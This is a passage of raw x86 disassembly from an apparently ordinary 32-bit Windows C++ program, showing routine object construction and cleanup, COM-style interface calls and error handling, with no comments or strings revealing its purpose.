  4031b7:	call   DWORD PTR ds:0x4121c0
  4031bd:	mov    BYTE PTR [ebp-0x4],0x9
  4031c1:	lea    ecx,[ebp-0xac]
  4031c7:	call   DWORD PTR ds:0x4121c0
  4031cd:	mov    BYTE PTR [ebp-0x4],0x8
  4031d1:	lea    ecx,[ebp-0x94]
  4031d7:	call   DWORD PTR ds:0x4121c0
  4031dd:	mov    BYTE PTR [ebp-0x4],0x7
  4031e1:	lea    ecx,[ebp-0xa0]
  4031e7:	call   DWORD PTR ds:0x4121c0
  4031ed:	mov    BYTE PTR [ebp-0x4],0x6
  4031f1:	lea    ecx,[ebp-0x9c]
  4031f7:	call   DWORD PTR ds:0x4121c0
  4031fd:	mov    BYTE PTR [ebp-0x4],0x5
  403201:	lea    ecx,[ebp-0xa8]
  403207:	call   DWORD PTR ds:0x4121c0
  40320d:	mov    BYTE PTR [ebp-0x4],0x4
  403211:	lea    ecx,[ebp-0x7c]
  403214:	call   DWORD PTR ds:0x4121c0
  40321a:	mov    BYTE PTR [ebp-0x4],0x3
  40321e:	lea    ecx,[ebp-0x68]
  403221:	call   DWORD PTR ds:0x4121c0
  403227:	mov    BYTE PTR [ebp-0x4],0x2
  40322b:	lea    ecx,[ebp-0x84]
  403231:	call   DWORD PTR ds:0x4121c0
  403237:	mov    BYTE PTR [ebp-0x4],0x1
  40323b:	lea    ecx,[ebp-0x88]
  403241:	call   DWORD PTR ds:0x4121c0
  403247:	mov    BYTE PTR [ebp-0x4],0x0
  40324b:	lea    ecx,[ebp-0x90]
  403251:	call   DWORD PTR ds:0x4121c0
  403257:	or     DWORD PTR [ebp-0x4],0xffffffff
  40325b:	lea    ecx,[ebp-0x80]
  40325e:	call   DWORD PTR ds:0x4121c0
  403264:	xor    eax,eax
  403266:	call   0x40ea30
  40326b:	ret    
  40326c:	push   0x8007000e
  403271:	call   DWORD PTR ds:0x412014
  403277:	call   0x4095c0
  40327c:	mov    eax,0x403282
  403281:	ret    
  403282:	mov    DWORD PTR [ebp-0x4],0x1f
  403289:	lea    ecx,[ebp-0xc8]
  40328f:	call   DWORD PTR ds:0x4121c0
  403295:	mov    BYTE PTR [ebp-0x4],0x1e
  403299:	lea    ecx,[ebp-0xd8]
  40329f:	call   DWORD PTR ds:0x4121c0
  4032a5:	mov    BYTE PTR [ebp-0x4],0x13
  4032a9:	lea    ecx,[ebp-0xdc]
  4032af:	call   DWORD PTR ds:0x4121c0
  4032b5:	jmp    0x402759
  4032ba:	push   0x8007000e
  4032bf:	call   DWORD PTR ds:0x412014
  4032c5:	call   0x4095c0
  4032ca:	mov    eax,0x4032d0
  4032cf:	ret    
  4032d0:	mov    DWORD PTR [ebp-0x4],0x1a
  4032d7:	lea    ecx,[ebp-0xd4]
  4032dd:	call   DWORD PTR ds:0x4121c0
  4032e3:	mov    BYTE PTR [ebp-0x4],0x13
  4032e7:	lea    ecx,[ebp-0xcc]
  4032ed:	jmp    0x4032af
  4032ef:	push   0x8007000e
  4032f4:	call   DWORD PTR ds:0x412014
  4032fa:	call   0x4095c0
  4032ff:	mov    eax,0x403305
  403304:	ret    
  403305:	jmp    0x403136
  40330a:	mov    eax,DWORD PTR [ebp-0x108]
  403310:	mov    ecx,DWORD PTR [eax+0x4]
  403313:	call   0x407454
  403318:	mov    eax,0x403136
  40331d:	ret    
  40331e:	int3   
  40331f:	int3   
  403320:	int3   
  403321:	int3   
  403322:	int3   
  403323:	push   0xa4
  403328:	mov    eax,0x40ed9c
  40332d:	call   0x40eaf2
  403332:	mov    edi,ecx
  403334:	xor    ebx,ebx
  403336:	mov    DWORD PTR [ebp-0xa0],ebx
  40333c:	lea    ecx,[ebp-0x64]
  40333f:	call   DWORD PTR ds:0x4121c4
  403345:	mov    DWORD PTR [ebp-0x4],ebx
  403348:	lea    ecx,[ebp-0x70]
  40334b:	call   DWORD PTR ds:0x4121c4
  403351:	mov    BYTE PTR [ebp-0x4],0x1
  403355:	mov    DWORD PTR [ebp-0x74],ebx
  403358:	mov    DWORD PTR [ebp-0x80],ebx
  40335b:	lea    ecx,[ebp-0x6c]
  40335e:	call   DWORD PTR ds:0x4121c4
  403364:	mov    BYTE PTR [ebp-0x4],0x2
  403368:	lea    ecx,[ebp-0x68]
  40336b:	call   DWORD PTR ds:0x4121c4
  403371:	mov    BYTE PTR [ebp-0x4],0x3
  403375:	lea    ecx,[ebp-0x7c]
  403378:	call   DWORD PTR ds:0x4121c4
  40337e:	mov    BYTE PTR [ebp-0x4],0x4
  403382:	lea    ecx,[ebp-0x78]
  403385:	call   DWORD PTR ds:0x4121c4
  40338b:	mov    BYTE PTR [ebp-0x4],0x5
  40338f:	lea    eax,[edi+0x18]
  403392:	push   eax
  403393:	mov    ecx,0x228
  403398:	call   0x4098dc
  40339d:	mov    edx,eax
  40339f:	mov    ecx,DWORD PTR [edi+0x14]
  4033a2:	call   0x405320
  4033a7:	mov    BYTE PTR [ebp-0x4],0x6
  4033ab:	fwait
  4033ac:	push   0x401354
  4033b1:	lea    ecx,[ebp-0xa4]
  4033b7:	call   0x40594b
  4033bc:	mov    DWORD PTR [ebp-0xa8],eax
  4033c2:	mov    BYTE PTR [ebp-0x4],0x7
  4033c6:	mov    eax,DWORD PTR [eax]
  4033c8:	test   eax,eax
  4033ca:	je     0x4033d0
  4033cc:	mov    ecx,DWORD PTR [eax]
  4033ce:	jmp    0x4033d2
  4033d0:	mov    ecx,ebx
  4033d2:	mov    eax,DWORD PTR [edi+0x10]
  4033d5:	mov    esi,DWORD PTR [eax]
  4033d7:	lea    edx,[ebp-0x80]
  4033da:	push   edx
  4033db:	push   ebx
  4033dc:	push   0x30
  4033de:	push   ecx
  4033df:	push   eax
  4033e0:	mov    ecx,DWORD PTR [esi+0x48]
  4033e3:	call   DWORD PTR ds:0x41228c
  4033e9:	call   DWORD PTR [esi+0x48]
  4033ec:	mov    esi,eax
  4033ee:	mov    BYTE PTR [ebp-0x4],0x6
  4033f2:	lea    ecx,[ebp-0xa4]
  4033f8:	call   0x4058ac
  4033fd:	test   esi,esi
  4033ff:	jns    0x40345d
  403401:	mov    ecx,esi
  403403:	call   0x407454
  403408:	mov    BYTE PTR [ebp-0x4],0x4
  40340c:	lea    ecx,[ebp-0x78]
  40340f:	call   DWORD PTR ds:0x4121c0
  403415:	mov    BYTE PTR [ebp-0x4],0x3
  403419:	lea    ecx,[ebp-0x7c]
  40341c:	call   DWORD PTR ds:0x4121c0
  403422:	mov    BYTE PTR [ebp-0x4],0x2
  403426:	lea    ecx,[ebp-0x68]
  403429:	call   DWORD PTR ds:0x4121c0
  40342f:	mov    BYTE PTR [ebp-0x4],0x1
  403433:	lea    ecx,[ebp-0x6c]
  403436:	call   DWORD PTR ds:0x4121c0
  40343c:	mov    BYTE PTR [ebp-0x4],bl
  40343f:	lea    ecx,[ebp-0x70]
  403442:	call   DWORD PTR ds:0x4121c0
  403448:	or     DWORD PTR [ebp-0x4],0xffffffff
  40344c:	lea    ecx,[ebp-0x64]
  40344f:	call   DWORD PTR ds:0x4121c0
  403455:	xor    eax,eax
  403457:	fwait
  403458:	jmp    0x4038bd
  40345d:	fwait
  40345e:	mov    DWORD PTR [ebp-0x4],0x5
  403465:	mov    edx,DWORD PTR [edi+0x44]
  403468:	mov    ecx,DWORD PTR [ebp-0x80]
  40346b:	call   0x4070c8
  403470:	test   eax,eax
  403472:	jns    0x4034d1
  403474:	mov    ecx,eax
  403476:	call   0x407454
  40347b:	mov    ecx,DWORD PTR [ebp-0x80]
  40347e:	test   ecx,ecx
  403480:	je     0x403495
  403482:	mov    eax,DWORD PTR [ecx]
  403484:	push   ecx
  403485:	mov    esi,DWORD PTR [eax+0x8]
  403488:	mov    ecx,esi
  40348a:	call   DWORD PTR ds:0x41228c
  403490:	call   esi
  403492:	mov    DWORD PTR [ebp-0x80],ebx
  403495:	mov    BYTE PTR [ebp-0x4],0x4
  403499:	lea    ecx,[ebp-0x78]
  40349c:	call   DWORD PTR ds:0x4121c0
  4034a2:	mov    BYTE PTR [ebp-0x4],0x3
  4034a6:	lea    ecx,[ebp-0x7c]
  4034a9:	call   DWORD PTR ds:0x4121c0
  4034af:	mov    BYTE PTR [ebp-0x4],0x2
  4034b3:	lea    ecx,[ebp-0x68]
  4034b6:	call   DWORD PTR ds:0x4121c0
  4034bc:	mov    BYTE PTR [ebp-0x4],0x1
  4034c0:	lea    ecx,[ebp-0x6c]
  4034c3:	call   DWORD PTR ds:0x4121c0
  4034c9:	mov    BYTE PTR [ebp-0x4],bl
  4034cc:	jmp    0x4038a5
  4034d1:	mov    eax,DWORD PTR [ebp-0x80]
  4034d4:	mov    esi,DWORD PTR [eax]
  4034d6:	lea    ecx,[ebp-0xa0]
  4034dc:	push   ecx
  4034dd:	lea    ecx,[ebp-0x74]
  4034e0:	push   ecx
  4034e1:	push   0x1
  4034e3:	push   0xffffffff
  4034e5:	push   eax
  4034e6:	mov    ecx,DWORD PTR [esi+0x10]
  4034e9:	call   DWORD PTR ds:0x41228c
  4034ef:	call   DWORD PTR [esi+0x10]
  4034f2:	mov    DWORD PTR [ebp-0xac],eax
  4034f8:	test   eax,eax
  4034fa:	js     0x403474
  403500:	mov    esi,0x138d
  403505:	mov    ecx,esi
  403507:	call   0x4098dc
  40350c:	push   eax
  40350d:	lea    eax,[ebp-0x6c]
  403510:	push   eax
  403511:	mov    edx,0x401380
  403516:	mov    ecx,DWORD PTR [ebp-0x74]
  403519:	call   0x4078a4
  40351e:	mov    ecx,esi
  403520:	call   0x4098dc
  403525:	push   eax
  403526:	lea    eax,[ebp-0x68]
  403529:	push   eax
  40352a:	mov    edx,0x40138c
  40352f:	mov    ecx,DWORD PTR [ebp-0x74]
  403532:	call   0x4078a4
  403537:	mov    ecx,esi
  403539:	call   0x4098dc
  40353e:	push   eax
  40353f:	lea    eax,[edi+0x40]
  403542:	push   eax
  403543:	mov    edx,0x40139c
  403548:	mov    ecx,DWORD PTR [ebp-0x74]
  40354b:	call   0x4078a4
  403550:	push   ecx
  403551:	lea    eax,[ebp-0x9c]
  403557:	push   eax
  403558:	mov    edx,0x4013b0
  40355d:	mov    ecx,DWORD PTR [ebp-0x74]
  403560:	call   0x40799a
  403565:	mov    ecx,esi
  403567:	call   0x4098dc
  40356c:	push   eax
  40356d:	lea    eax,[ebp-0x7c]
  403570:	push   eax
  403571:	mov    edx,0x4013c8
  403576:	mov    ecx,DWORD PTR [ebp-0x74]
  403579:	call   0x4078a4
  40357e:	mov    ecx,esi
  403580:	call   0x4098dc
  403585:	push   eax
  403586:	lea    eax,[ebp-0x78]
  403589:	push   eax
  40358a:	mov    edx,0x401148
  40358f:	mov    ecx,DWORD PTR [ebp-0x74]
  403592:	call   0x4078a4
  403597:	lea    eax,[ebp-0x98]
  40359d:	push   eax
  40359e:	mov    ecx,DWORD PTR [ebp-0x74]
  4035a1:	call   0x407aca
  4035a6:	mov    ecx,DWORD PTR [ebp-0x80]
  4035a9:	test   ecx,ecx
  4035ab:	je     0x4035c0
  4035ad:	mov    eax,DWORD PTR [ecx]
  4035af:	push   ecx
  4035b0:	mov    esi,DWORD PTR [eax+0x8]
  4035b3:	mov    ecx,esi
  4035b5:	call   DWORD PTR ds:0x41228c
  4035bb:	call   esi
  4035bd:	mov    DWORD PTR [ebp-0x80],ebx
  4035c0:	mov    ecx,DWORD PTR [ebp-0x74]
  4035c3:	test   ecx,ecx
  4035c5:	je     0x4035da
  4035c7:	mov    eax,DWORD PTR [ecx]
  4035c9:	push   ecx
  4035ca:	mov    esi,DWORD PTR [eax+0x8]
  4035cd:	mov    ecx,esi
  4035cf:	call   DWORD PTR ds:0x41228c
  4035d5:	call   esi
  4035d7:	mov    DWORD PTR [ebp-0x74],ebx
  4035da:	mov    BYTE PTR [ebp-0x4],0x9
  4035de:	fwait
  4035df:	lea    ecx,[ebp-0x84]
  4035e5:	call   DWORD PTR ds:0x4121c4
  4035eb:	mov    BYTE PTR [ebp-0x4],0xa
  4035ef:	mov    DWORD PTR [ebp-0x60],ebx
  4035f2:	push   0x3e
  4035f4:	push   ebx
  4035f5:	lea    eax,[ebp-0x5c]
  4035f8:	push   eax
  4035f9:	call   0x40eb54
  4035fe:	add    esp,0xc
  403601:	mov    eax,DWORD PTR [ebp-0x98]
  403607:	mov    ecx,DWORD PTR [ebp-0x94]
  40360d:	mov    DWORD PTR [ebp-0x90],eax
  403613:	mov    eax,ecx
  403615:	and    ecx,0x7fffffff
  40361b:	mov    DWORD PTR [ebp-0x8c],ecx
  403621:	fild   QWORD PTR [ebp-0x90]
  403627:	mov    ecx,0x80000000
  40362c:	and    eax,ecx
  40362e:	mov    DWORD PTR [ebp-0x8c],eax
  403634:	mov    DWORD PTR [ebp-0x90],ebx
  40363a:	fild   QWORD PTR [ebp-0x90]
  403640:	fchs   
  403642:	faddp  st(1),st
  403644:	fstp   DWORD PTR [ebp-0x8c]
  40364a:	fld    DWORD PTR [ebp-0x8c]
  403650:	fmul   QWORD PTR ds:0x401c38
  403656:	fadd   QWORD PTR ds:0x401c48
  40365c:	mov    esi,ebx
  40365e:	fld    QWORD PTR ds:0x401c50
  403664:	fcom   st(1)
  403666:	fnstsw ax
  403668:	test   ah,0x41
  40366b:	jp     0x40367e
  40366d:	fsub   st(1),st
  40366f:	fcomp  st(1)
  403671:	fnstsw ax
  403673:	test   ah,0x41
  403676:	jne    0x403680
  403678:	add    esi,esi
  40367a:	adc    ebx,ecx
  40367c:	jmp    0x403680
  40367e:	fstp   st(0)
  403680:	call   0x40eb3c
  403685:	add    eax,esi
  403687:	adc    edx,ebx
  403689:	mov    DWORD PTR [ebp-0x98],eax
  40368f:	mov    DWORD PTR [ebp-0x94],edx
  403695:	push   0xa
  403697:	lea    ecx,[ebp-0x60]
  40369a:	push   ecx
  40369b:	push   edx
  40369c:	push   eax
  40369d:	call   DWORD PTR ds:0x41223c
  4036a3:	add    esp,0x10
  4036a6:	lea    edx,[ebp-0x84]
  4036ac:	lea    ecx,[ebp-0x60]
  4036af:	call   0x40561a
  4036b4:	test   eax,eax
  4036b6:	jne    0x403705
  4036b8:	mov    BYTE PTR [ebp-0x4],0x9
  4036bc:	lea    ecx,[ebp-0x84]
  4036c2:	call   DWORD PTR ds:0x4121c0
  4036c8:	mov    BYTE PTR [ebp-0x4],0x4
  4036cc:	lea    ecx,[ebp-0x78]
  4036cf:	call   DWORD PTR ds:0x4121c0
  4036d5:	mov    BYTE PTR [ebp-0x4],0x3
  4036d9:	lea    ecx,[ebp-0x7c]
  4036dc:	call   DWORD PTR ds:0x4121c0
  4036e2:	mov    BYTE PTR [ebp-0x4],0x2
  4036e6:	lea    ecx,[ebp-0x68]
  4036e9:	call   DWORD PTR ds:0x4121c0
  4036ef:	mov    BYTE PTR [ebp-0x4],0x1
  4036f3:	lea    ecx,[ebp-0x6c]
  4036f6:	call   DWORD PTR ds:0x4121c0
  4036fc:	mov    BYTE PTR [ebp-0x4],0x0
  403700:	jmp    0x40343f
  403705:	push   DWORD PTR [ebp-0x84]
  40370b:	push   0x68
  40370d:	pop    ecx
  40370e:	call   0x4098dc
  403713:	push   eax
  403714:	lea    eax,[ebp-0x70]
  403717:	push   eax
  403718:	call   DWORD PTR ds:0x4121b4
  40371e:	add    esp,0xc
  403721:	mov    BYTE PTR [ebp-0x4],0x9
  403725:	lea    ecx,[ebp-0x84]
  40372b:	call   DWORD PTR ds:0x4121c0
  403731:	fwait
  403732:	mov    DWORD PTR [ebp-0x4],0x5
  403739:	mov    BYTE PTR [ebp-0x4],0xc
  40373d:	fwait
  40373e:	mov    eax,DWORD PTR [ebp-0x9c]
  403744:	sub    eax,0x0
  403747:	je     0x403785
  403749:	sub    eax,0x1
  40374c:	je     0x40377e
  40374e:	sub    eax,0x1
  403751:	je     0x403777
  403753:	sub    eax,0x1
  403756:	je     0x403770
  403758:	sub    eax,0x1
  40375b:	je     0x403769
  40375d:	sub    eax,0x1
  403760:	jne    0x403799
  403762:	mov    ecx,0x87
  403767:	jmp    0x40378a
  403769:	mov    ecx,0x86
  40376e:	jmp    0x40378a
  403770:	mov    ecx,0x85
  403775:	jmp    0x40378a
  403777:	mov    ecx,0x84
  40377c:	jmp    0x40378a
  40377e:	mov    ecx,0x83
  403783:	jmp    0x40378a
  403785:	mov    ecx,0x82
  40378a:	call   0x4098dc
  40378f:	push   eax
  403790:	lea    ecx,[ebp-0x64]
  403793:	call   DWORD PTR ds:0x4121b0
  403799:	fwait
  40379a:	mov    DWORD PTR [ebp-0x4],0x5
  4037a1:	push   ecx
  4037a2:	push   DWORD PTR [ebp-0x68]
  4037a5:	push   0x1c
  4037a7:	xor    edx,edx
  4037a9:	mov    ecx,DWORD PTR [edi+0x30]
  4037ac:	call   0x40b94a
  4037b1:	push   ecx
  4037b2:	push   DWORD PTR [ebp-0x6c]
  4037b5:	push   0xc
  4037b7:	xor    edx,edx
  4037b9:	mov    ecx,DWORD PTR [edi+0x30]
  4037bc:	call   0x40b94a
  4037c1:	push   ecx
  4037c2:	push   DWORD PTR [ebp-0x64]
  4037c5:	push   0x4
  4037c7:	xor    edx,edx
  4037c9:	mov    ecx,DWORD PTR [edi+0x30]
  4037cc:	call   0x40b94a
  4037d1:	push   ecx
  4037d2:	push   DWORD PTR [ebp-0x7c]
  4037d5:	push   0xd
  4037d7:	xor    edx,edx
  4037d9:	mov    ecx,DWORD PTR [edi+0x30]
  4037dc:	call   0x40b94a
  4037e1:	push   ecx
  4037e2:	push   DWORD PTR [ebp-0x78]
  4037e5:	push   0xb
  4037e7:	xor    edx,edx
  4037e9:	mov    ecx,DWORD PTR [edi+0x30]
  4037ec:	call   0x40b94a
  4037f1:	push   ecx
  4037f2:	push   DWORD PTR [ebp-0x70]
  4037f5:	push   0x16
  4037f7:	xor    edx,edx
  4037f9:	mov    ecx,DWORD PTR [edi+0x30]
  4037fc:	call   0x40b94a
  403801:	mov    BYTE PTR [ebp-0x4],0x4
  403805:	lea    ecx,[ebp-0x78]
  403808:	call   DWORD PTR ds:0x4121c0
  40380e:	mov    BYTE PTR [ebp-0x4],0x3
  403812:	lea    ecx,[ebp-0x7c]
  403815:	call   DWORD PTR ds:0x4121c0
  40381b:	mov    BYTE PTR [ebp-0x4],0x2
  40381f:	lea    ecx,[ebp-0x68]
  403822:	call   DWORD PTR ds:0x4121c0
  403828:	mov    BYTE PTR [ebp-0x4],0x1
  40382c:	lea    ecx,[ebp-0x6c]
  40382f:	call   DWORD PTR ds:0x4121c0
  403835:	mov    BYTE PTR [ebp-0x4],0x0
  403839:	lea    ecx,[ebp-0x70]
  40383c:	call   DWORD PTR ds:0x4121c0
  403842:	or     DWORD PTR [ebp-0x4],0xffffffff
  403846:	lea    ecx,[ebp-0x64]
  403849:	call   DWORD PTR ds:0x4121c0
  40384f:	xor    eax,eax
  403851:	inc    eax
  403852:	jmp    0x4038bd
  403854:	push   0x8007000e
  403859:	call   DWORD PTR ds:0x412014
  40385f:	call   0x4095c0
  403864:	mov    eax,0x40386a
  403869:	ret    
  40386a:	mov    DWORD PTR [ebp-0x4],0x4
  403871:	lea    ecx,[ebp-0x78]
  403874:	call   DWORD PTR ds:0x4121c0
  40387a:	mov    BYTE PTR [ebp-0x4],0x3
  40387e:	lea    ecx,[ebp-0x7c]
  403881:	call   DWORD PTR ds:0x4121c0
  403887:	mov    BYTE PTR [ebp-0x4],0x2
  40388b:	lea    ecx,[ebp-0x68]
  40388e:	call   DWORD PTR ds:0x4121c0
  403894:	mov    BYTE PTR [ebp-0x4],0x1
  403898:	lea    ecx,[ebp-0x6c]
  40389b:	call   DWORD PTR ds:0x4121c0
  4038a1:	mov    BYTE PTR [ebp-0x4],0x0
  4038a5:	lea    ecx,[ebp-0x70]
  4038a8:	call   DWORD PTR ds:0x4121c0
  4038ae:	or     DWORD PTR [ebp-0x4],0xffffffff
  4038b2:	lea    ecx,[ebp-0x64]
  4038b5:	call   DWORD PTR ds:0x4121c0
  4038bb:	xor    eax,eax
  4038bd:	call   0x40ea30
  4038c2:	ret    
  4038c3:	push   0x8007000e
  4038c8:	call   DWORD PTR ds:0x412014
  4038ce:	call   0x4095c0
  4038d3:	mov    eax,0x4038d9
  4038d8:	ret    
  4038d9:	jmp    0x40386a
  4038db:	mov    eax,DWORD PTR [ebp-0xb0]
  4038e1:	mov    ecx,DWORD PTR [eax+0x4]
  4038e4:	call   0x407454
  4038e9:	mov    eax,0x40386a
  4038ee:	ret    
  4038ef:	int3   
  4038f0:	int3   
  4038f1:	int3   
  4038f2:	int3   
  4038f3:	int3   
  4038f4:	push   0x44
  4038f6:	mov    eax,0x40ee07
  4038fb:	call   0x40eaf2
  403900:	mov    ebx,ecx
  403902:	xor    eax,eax
  403904:	mov    DWORD PTR [ebp-0x3c],eax
  403907:	mov    DWORD PTR [ebp-0x18],eax
  40390a:	mov    DWORD PTR [ebp-0x1c],eax
  40390d:	lea    ecx,[ebp-0x24]
  403910:	call   DWORD PTR ds:0x4121c4
  403916:	and    DWORD PTR [ebp-0x4],0x0
  40391a:	lea    ecx,[ebp-0x34]
  40391d:	call   DWORD PTR ds:0x4121c4
  403923:	mov    BYTE PTR [ebp-0x4],0x1
  403927:	lea    ecx,[ebp-0x2c]
  40392a:	call   DWORD PTR ds:0x4121c4
  403930:	mov    BYTE PTR [ebp-0x4],0x2
  403934:	lea    ecx,[ebp-0x20]
  403937:	call   DWORD PTR ds:0x4121c4
  40393d:	mov    BYTE PTR [ebp-0x4],0x3
  403941:	lea    ecx,[ebp-0x28]
  403944:	call   DWORD PTR ds:0x4121c4
  40394a:	mov    BYTE PTR [ebp-0x4],0x4
  40394e:	lea    ecx,[ebp-0x30]
  403951:	call   DWORD PTR ds:0x4121c4
  403957:	mov    BYTE PTR [ebp-0x4],0x5
  40395b:	lea    eax,[ebx+0x18]
  40395e:	push   eax
  40395f:	mov    ecx,0x22b
  403964:	call   0x4098dc
  403969:	mov    edx,eax
  40396b:	mov    ecx,DWORD PTR [ebx+0x14]
  40396e:	call   0x405320
  403973:	mov    BYTE PTR [ebp-0x4],0x6
  403977:	push   0x401408
  40397c:	lea    ecx,[ebp-0x38]
  40397f:	call   0x40594b
  403984:	mov    BYTE PTR [ebp-0x4],0x7
  403988:	mov    eax,DWORD PTR [eax]
  40398a:	test   eax,eax
  40398c:	je     0x403992
  40398e:	mov    ecx,DWORD PTR [eax]
  403990:	jmp    0x403994
  403992:	xor    ecx,ecx
  403994:	mov    eax,DWORD PTR [ebx+0x10]
  403997:	mov    esi,DWORD PTR [eax]
  403999:	lea    edx,[ebp-0x1c]
  40399c:	push   edx
  40399d:	push   0x0
  40399f:	push   0x30
  4039a1:	push   ecx
  4039a2:	push   eax
  4039a3:	mov    ecx,DWORD PTR [esi+0x48]
  4039a6:	call   DWORD PTR ds:0x41228c
  4039ac:	call   DWORD PTR [esi+0x48]
  4039af:	mov    esi,eax
  4039b1:	mov    BYTE PTR [ebp-0x4],0x6
  4039b5:	lea    ecx,[ebp-0x38]
  4039b8:	call   0x4058ac
  4039bd:	test   esi,esi
  4039bf:	jns    0x4039d1
  4039c1:	mov    ecx,esi
  4039c3:	call   0x407454
  4039c8:	mov    BYTE PTR [ebp-0x4],0x4
  4039cc:	jmp    0x403bee
  4039d1:	mov    DWORD PTR [ebp-0x4],0x5
  4039d8:	mov    edx,DWORD PTR [ebx+0x44]
  4039db:	mov    ecx,DWORD PTR [ebp-0x1c]
  4039de:	call   0x4070c8
  4039e3:	test   eax,eax
  4039e5:	jns    0x403a0b
  4039e7:	mov    ecx,eax
  4039e9:	call   0x407454
  4039ee:	mov    ecx,DWORD PTR [ebp-0x1c]
  4039f1:	test   ecx,ecx
  4039f3:	je     0x4039c8
  4039f5:	mov    eax,DWORD PTR [ecx]
  4039f7:	push   ecx
  4039f8:	mov    esi,DWORD PTR [eax+0x8]
  4039fb:	mov    ecx,esi
  4039fd:	call   DWORD PTR ds:0x41228c
  403a03:	call   esi
  403a05:	and    DWORD PTR [ebp-0x1c],0x0
  403a09:	jmp    0x4039c8
  403a0b:	mov    eax,DWORD PTR [ebp-0x1c]
  403a0e:	mov    esi,DWORD PTR [eax]
  403a10:	lea    ecx,[ebp-0x3c]
  403a13:	push   ecx
  403a14:	lea    ecx,[ebp-0x18]
  403a17:	push   ecx
  403a18:	push   0x1
  403a1a:	push   0xffffffff
  403a1c:	push   eax
  403a1d:	mov    ecx,DWORD PTR [esi+0x10]
  403a20:	call   DWORD PTR ds:0x41228c
  403a26:	call   DWORD PTR [esi+0x10]
  403a29:	test   eax,eax
  403a2b:	js     0x4039e7
  403a2d:	push   ecx
  403a2e:	lea    eax,[ebp-0x38]
  403a31:	push   eax
  403a32:	mov    edx,0x401420
  403a37:	mov    ecx,DWORD PTR [ebp-0x18]
  403a3a:	call   0x40799a
  403a3f:	mov    esi,0x138d
  403a44:	cmp    DWORD PTR [ebp-0x38],0x0
  403a48:	je     0x403ac5
  403a4a:	mov    ecx,esi
  403a4c:	call   0x4098dc
  403a51:	push   eax
  403a52:	lea    eax,[ebp-0x34]
  403a55:	push   eax
  403a56:	mov    edx,0x40143c
  403a5b:	mov    ecx,DWORD PTR [ebp-0x18]
  403a5e:	call   0x4078a4
  403a63:	test   eax,eax
  403a65:	je     0x403ac5
  403a67:	mov    ecx,esi
  403a69:	call   0x4098dc
  403a6e:	push   eax
  403a6f:	lea    eax,[ebp-0x2c]
  403a72:	push   eax
  403a73:	mov    edx,0x401148
  403a78:	mov    ecx,DWORD PTR [ebp-0x18]
  403a7b:	call   0x4078a4
  403a80:	lea    eax,[ebp-0x50]
  403a83:	push   eax
  403a84:	mov    edx,0x401460
  403a89:	mov    ecx,DWORD PTR [ebp-0x18]
  403a8c:	call   0x407b91
  403a91:	sub    esp,0x10
  403a94:	lea    esi,[ebp-0x50]
  403a97:	mov    edi,esp
  403a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a9d:	lea    edx,[ebp-0x28]
  403aa0:	lea    ecx,[ebp-0x20]
  403aa3:	call   0x4022d9
  403aa8:	push   DWORD PTR [ebp-0x20]
  403aab:	push   DWORD PTR [ebp-0x34]
  403aae:	push   DWORD PTR [ebp-0x2c]
  403ab1:	push   0x401478
  403ab6:	lea    eax,[ebp-0x24]
  403ab9:	push   eax
  403aba:	call   DWORD PTR ds:0x4121b4
  403ac0:	add    esp,0x14
  403ac3:	jmp    0x403b3d
  403ac5:	mov    ecx,esi
  403ac7:	call   0x4098dc
  403acc:	push   eax
  403acd:	lea    eax,[ebp-0x30]
  403ad0:	push   eax
  403ad1:	mov    edx,0x40148c
  403ad6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ad9:	call   0x4078a4
  403ade:	test   eax,eax
  403ae0:	je     0x403b24
  403ae2:	lea    eax,[ebp-0x50]
  403ae5:	push   eax
  403ae6:	mov    edx,0x401460
  403aeb:	mov    ecx,DWORD PTR [ebp-0x18]
  403aee:	call   0x407b91
  403af3:	sub    esp,0x10
  403af6:	lea    esi,[ebp-0x50]
  403af9:	mov    edi,esp
  403afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aff:	lea    edx,[ebp-0x28]
  403b02:	lea    ecx,[ebp-0x20]
  403b05:	call   0x4022d9
  403b0a:	push   DWORD PTR [ebp-0x20]
  403b0d:	push   DWORD PTR [ebp-0x30]
  403b10:	push   0x401340
  403b15:	lea    eax,[ebp-0x24]
  403b18:	push   eax
  403b19:	call   DWORD PTR ds:0x4121b4
  403b1f:	add    esp,0x10
  403b22:	jmp    0x403b3d
  403b24:	mov    ecx,esi
  403b26:	call   0x4098dc
  403b2b:	push   eax
  403b2c:	lea    eax,[ebp-0x24]
  403b2f:	push   eax
  403b30:	mov    edx,0x401108
  403b35:	mov    ecx,DWORD PTR [ebp-0x18]
  403b38:	call   0x4078a4
  403b3d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b40:	test   ecx,ecx
  403b42:	je     0x403b58
  403b44:	mov    eax,DWORD PTR [ecx]
  403b46:	push   ecx
  403b47:	mov    esi,DWORD PTR [eax+0x8]
  403b4a:	mov    ecx,esi
  403b4c:	call   DWORD PTR ds:0x41228c
  403b52:	call   esi
  403b54:	and    DWORD PTR [ebp-0x1c],0x0
  403b58:	mov    ecx,DWORD PTR [ebp-0x18]
  403b5b:	test   ecx,ecx
  403b5d:	je     0x403b73
  403b5f:	mov    eax,DWORD PTR [ecx]
  403b61:	push   ecx
  403b62:	mov    esi,DWORD PTR [eax+0x8]
  403b65:	mov    ecx,esi
  403b67:	call   DWORD PTR ds:0x41228c
  403b6d:	call   esi
  403b6f:	and    DWORD PTR [ebp-0x18],0x0
  403b73:	push   ecx
  403b74:	push   DWORD PTR [ebp-0x24]
  403b77:	push   0xf
  403b79:	xor    edx,edx
  403b7b:	mov    ecx,DWORD PTR [ebx+0x30]
  403b7e:	call   0x40b94a
  403b83:	mov    BYTE PTR [ebp-0x4],0x4
  403b87:	lea    ecx,[ebp-0x30]
  403b8a:	call   DWORD PTR ds:0x4121c0
  403b90:	mov    BYTE PTR [ebp-0x4],0x3
  403b94:	lea    ecx,[ebp-0x28]
  403b97:	call   DWORD PTR ds:0x4121c0
  403b9d:	mov    BYTE PTR [ebp-0x4],0x2
  403ba1:	lea    ecx,[ebp-0x20]
